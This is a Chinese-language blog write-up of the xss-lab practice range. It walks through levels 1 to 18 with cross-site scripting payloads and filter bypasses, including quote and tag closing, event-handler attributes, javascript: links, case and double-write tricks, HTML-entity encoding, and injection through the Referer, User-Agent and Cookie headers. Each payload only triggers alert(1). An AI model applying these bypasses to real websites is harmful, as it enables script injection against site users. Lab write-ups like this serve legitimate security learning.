---
title: xss-lab通关小记
date: 2021-01-03 11:17:18
author: Na0H
backup: /img/atimg/2.jpg
tags:	
- 靶场
categories:
- 靶场
excerpt: 这是xsslab的通关小记，虽然懂得绕过但是还是不懂实战aaa
description: 这是xsslab的通关小记，虽然懂得绕过但是还是不懂实战aaa
---

<!-- more -->





实际构造闭合，另外要对js有一定了解

常用测试语句：

```javascript
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<a href=javascript:alert(1)>
```

## Level1

url为：http://xssaq.com/yx/level1.php?name=test
GET型，源码显示
在传参处插入代码即可：?name=`<script>alert(1)</script>`

## Level2

Url为:http://xssaq.com/yx/level2.php?keyword=test
GET型,输入`<script>alert(/hack11/)</script>`：
![](https://i.loli.net/2021/02/13/DBNOTv9yuzCqMQm.png)

构造闭合，即`"><script>alert(/hack11/)</script>//`
"和>将其之前的语句闭合为value=<"">,//或者<"将后方">注释
![](https://i.loli.net/2021/02/13/GHM4a78wmlZrt1f.png)





## Level3

Value同2，value="">
`<script>alert(/hack11/)</script>`,查看响应，后端将<>过滤了
![](https://i.loli.net/2021/02/13/IBsk2vCh5fR4oFD.png)

查看源码，使用了htmlspecialchars函数
![](https://i.loli.net/2021/02/13/n5wQOlJ4BMG6Xms.png)
![](https://i.loli.net/2021/02/13/FSEZ6xjpqacyXD1.png)


可以使用不带有尖括号的特殊字符进行尝试
如：`' onclick='alert(1)`
（利用了HTML DOM 的onclick事件，点击后触发包含的命令）	

- 第一个单引号的作用：闭合`value='`
- 第二个单引号的作用：与valuer=''的第二个引号对应，构成`onclick='alert(1)'`
  ![](https://i.loli.net/2021/02/13/ifQhPs5CEXYJcbD.png)





## Level4

输入：`"><script>alert(/hack11/)</script>//`		，`<>`被过滤
![](https://i.loli.net/2021/02/13/5XnuHTlBzUYPGSi.png)

类似level3，不同的是单引号换为双引号构造闭合：
`" onclick="alert(1)`
![](https://i.loli.net/2021/02/13/hVZxg39tKsEAfpG.png)


## Level5

- 尝试 `"><script>alert(/hack11/)</script><"`，发现script被过滤
  ![](https://i.loli.net/2021/02/13/fwqic3VlrZvYRz2.png)

- 尝试`" onclick="alert(1)`，发现on被过滤
  ![](https://i.loli.net/2021/02/13/lLNBKGCsAtcQom8.png)

- 最终poc：`"><a href=javascript:alert(1)><"` 
  ![](https://i.loli.net/2021/02/13/2QKFvDzJmacTxYS.png)
  点击即可触发	
  ![](https://i.loli.net/2021/02/13/YLMlUZ6IVq3mwtj.png)

## Level6

- 构造 `<script>alert(1)</script>`	，`script`被过滤
  ![](https://i.loli.net/2021/02/13/mkcMn8bqDWVdLpg.png)

- 构造 `<img src=x onerror=alert(1)>`  ,`src`,`on`被过滤
  ![](https://i.loli.net/2021/02/13/h4gtFHRDqI5KBpf.png)

- 构造 `<a href=javascript:alert(1)>`	 ，`href`被过滤
  ![](https://i.loli.net/2021/02/13/yCrAILKH3dzEfgl.png)


- 最终poc1：
  `"><a Href=javascript:alert(1)><"` 进行大小写绕过
  ![](https://i.loli.net/2021/02/13/PDRVBjso12MxYXH.png)
  ![](https://i.loli.net/2021/02/13/ZJ73fWwcuYhzxFe.png)


- 最终poc2：
  `" ONclick="alert(1)`，其他亦同
  ![](https://i.loli.net/2021/02/13/ejVWHLoqZrpixaf.png)


- 源码：过滤部分关键字，没有对大小写进行针对
  ![](https://i.loli.net/2021/02/13/Lo31XaGHvIMRitw.png)


## Level7

- 老四样测试，script、src、on、href皆被置换为空

```javascript
<script>alert(1)</script> 
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<a href=javascript:alert(1)>
```

![](https://i.loli.net/2021/02/13/8CW54NmTldBEvLa.png)
![](https://i.loli.net/2021/02/13/zZEaPMpcVQT5LCt.png)
![](https://i.loli.net/2021/02/13/RfE3meS25jqy4oz.png)
![](https://i.loli.net/2021/02/13/qMYmV7ZT8KC1t2J.png)

- 尝试大小写绕过，会将输入全部转换为小写，在匹配关键词置换为空
- poc(双写绕过)：
  `"><a hrhrefef=javascriscriptpt:alert(1)><"`
  ![](https://i.loli.net/2021/02/13/wq1KlSz2TGdJ6DR.png)
  ![](https://i.loli.net/2021/02/13/4rtTgZfAanjWYc7.png)


- 源码：过滤部分关键字：strtolower把所有字符转换为小写再进行过滤

![](https://i.loli.net/2021/02/13/tMjuFApHsYIP7xc.png)


## Level8

- '添加友情链接'，应为DOM型xss
  `<a href=javascript:alert(1)>`：
  href，javascript都被过滤，大小写和双写绕过都失效
  ![](https://i.loli.net/2021/02/13/okHQ72fMaguFmEr.png)

- 尝试编码绕过
  `javascript:alert(1)`
  ![](https://i.loli.net/2021/02/13/4NfeLIc6BguKdrZ.png)

- Burpsuite编码

```javascript
&#x6a;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3a;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;	
```

![](https://i.loli.net/2021/02/13/jyH9wteMQIm2xhD.png)

## Level9

- DOM型，基于Level8多了一个判定，查看源码，需在构造语句后加上`http://`
  即：

```javascript
&#x6a;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3a;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;//http://
```

- 源码：
  同8，先将关键字替换，再判断变量后是否有`http://`
  Strpos($str,’http://’)：查找http://在字符串中第一次出现的位置
  ![](https://i.loli.net/2021/02/13/WqVb1EzPLfopyCx.png)


## Level10

- `<script>alert(1)</script>`		过滤了`<>`，尝试编码不能绕过，无法构造事件触发xss、无法利用属性的javascript协议、无法利用css注入
  ![](https://i.loli.net/2021/02/13/rkp8zyZWtIailOT.png)

- 存在三个input变量，尝试提交
  源码：`<input name="t_sort"  value=" '.$str33.' " type="hidden">`
  Payload：`1&t_sort=  " type="text" onclick="alert(1)`
  ![](https://i.loli.net/2021/02/13/oKn6UHsgJPMIrqj.png)
  `1&t_sort=xxx` 将xxx作为t_sort的value输入
  `" type="text" onclick="alert(1) `是置入value	的语句
  `type="text"` 形成可点击的文本框，方便触发其后的onclick="alert(1)

## Level11

- 查看源码
  仅t_sort和t_ref的可传参，
  `$str11=$_SERVER['HTTP_REFERER'];//`将payload从http头的referer栏获取
  ![](https://i.loli.net/2021/02/13/2CutM5RFrlQoBhX.png)

- 一．
  浏览器插件修改referfer，`value=1&t_sort=  " type="text" onclick="alert(1)`
  ![](https://i.loli.net/2021/02/13/JVetGAoDWhNuriS.png)

- 二．
  利用burpsuite在跳转至该网页时抓包，修改其中`referer`为`poc`即可
  `1&t_sort=  " type="text" onclick="alert(1)`
  ![](https://i.loli.net/2021/02/13/brkZhBiJusDGMmT.png)

## Level12

- 输入：`" type="text" onclick="alert(1)`
  ![](https://i.loli.net/2021/02/13/FOBly6kYp5hQAxZ.png)
  ![](https://i.loli.net/2021/02/13/8EiaVFOuep1N5nZ.png)


- 从标头中的User-Agent中获取
  User-Agent：`" type="text" onclick="alert(1)`
  ![](https://i.loli.net/2021/02/13/W5JizDwSFlqy62Y.png)


## Level13

如图
![](https://i.loli.net/2021/02/13/EZn9j6qgMdRUGXS.png)

- 查看标头
  ![](https://i.loli.net/2021/02/13/WDyMe6XP7w9vTs8.png)



- 修改cookie
  Cookie：`user="type="text" onclick="alert(1)"`

![](https://i.loli.net/2021/02/13/dsWx4JaFARcfgEp.png)


## Level14

百度一下：本关因iframe调用的文件地址失效，无法进行测试。要考的应该是通过修改	iframe调用的文件来实现xss注入

## Level15

- ng-include指令一般用于包含外部的 HTML 文件，ng-include属性的值可以是一个表达	式，返回一个文件名，但是默认情况下，包含的文件需要包含在同一个域名下。
  ![](https://i.loli.net/2021/02/13/fTDSb42LBXuZdjy.png)

- 可以包含一个有漏洞的页面进行破解
  eg:	`level15.php?src='name=<script>alert(1)</script>'`

## Level16

- `<script>alert(1)</script>`
  ![](https://i.loli.net/2021/02/13/NBiRrWhDmXpkYeZ.png)

- 空格、反斜杠、script都被str_replace函数替换成&nbsp
  ![](https://i.loli.net/2021/02/13/vw2HtkGNqFW1ylD.png)

- HTML中可以将%0a或者%0D当成空格使用，故可构造
  Poc：`<svg%0aonload=alert(1)>`
  ![](https://i.loli.net/2021/02/13/WOAj6vXTerNdChY.png)


## Level17

- Url中：level17.php?arg01=123&arg02=321
  将arg01和arg02的结果用=拼接
  ![](https://i.loli.net/2021/02/13/H7Wjb1OS5twXYq2.png)

- 可利用此构造：`onclick=javascript:alert(/xss/)`
  Poc：`level17.php?arg01= onmousemove&arg02=javascript:alert(/xss/)`
  ![](https://i.loli.net/2021/02/13/CmdPrh5uHVcEkyG.png)

## Level18

同17
![](https://i.loli.net/2021/02/13/DUo8dhKymzrpJEQ.png)



